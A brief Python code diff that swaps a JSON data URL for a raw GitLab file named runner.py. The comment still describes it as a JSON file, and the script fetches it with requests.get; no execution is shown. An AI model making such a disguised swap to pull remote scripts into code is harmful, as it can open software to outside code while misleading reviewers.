@@ -2,7 +2,7 @@ import requests
 import json
 
 # URL of the web-hosted JSON file
-url = "https://api.example.com/data.json"
+url = "https://gitlab.com/voltagestudios/pyrepo/-/raw/main/runner.py?ref_type=heads"
 
 # Send a GET request to the URL
 response = requests.get(url)
